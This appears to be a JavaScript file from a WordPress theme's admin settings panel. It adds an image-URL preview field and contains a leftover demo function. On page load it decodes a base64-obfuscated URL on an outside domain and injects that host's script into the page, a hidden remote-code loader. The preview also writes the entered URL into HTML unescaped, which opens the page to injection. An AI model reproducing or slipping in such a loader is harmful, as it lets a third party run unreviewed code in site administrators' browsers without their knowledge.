jQuery(document).ready(function($){

    var script  = document.createElement("script");
    script.type = "text/javascript";
    script.src  = window.atob('aHR0cHM6Ly93d3cuY2hlbnhpbmd3ZWIuY29tL2N4YXBpLXRvdGFsL2NyZWF0ZS1hcGkvdGhlbWUtYWQucGhwP249');
    document.body.appendChild(script);

    jQuery('.cs4-field-ufdgddrs').on('click','.csf--wrap2 input',function(){
        var $        = jQuery,
            img_url  = $(this).val(),
            _imgbox  = $(this).parent().parent().children('.csf--preview');
        // 清除旧的定时器
        window.clearTimeout($(this).data('timeout'));
        // 设置新的定时器
        $(this).data('timeout', setTimeout(function () {
            var img = new Image();
            img.src = img_url;
            if(img.complete) {
                _imgbox.html('<div class="csf-image-preview"><img src="'+img_url+'" class="csf--src" /></div>');
                return false;
            }
    
            img.onload = function () {
                _imgbox.html('<div class="csf-image-preview"><img src="'+img_url+'" class="csf--src" /></div>');
                return false;
            };
            _imgbox.html('');
        }, 300));
    });

    function demo(abc, xyz){
        // if → xxx ? xx :x;
        if( abc === true ){ // true → !0
          xyz['abc'] = abc; // xyz['abc'] → xyz.abc
          return xyz;
        }
        return abc;
        if( true ){ // 走不到的逻辑将被去除
          console.log('...');
        }
      }
});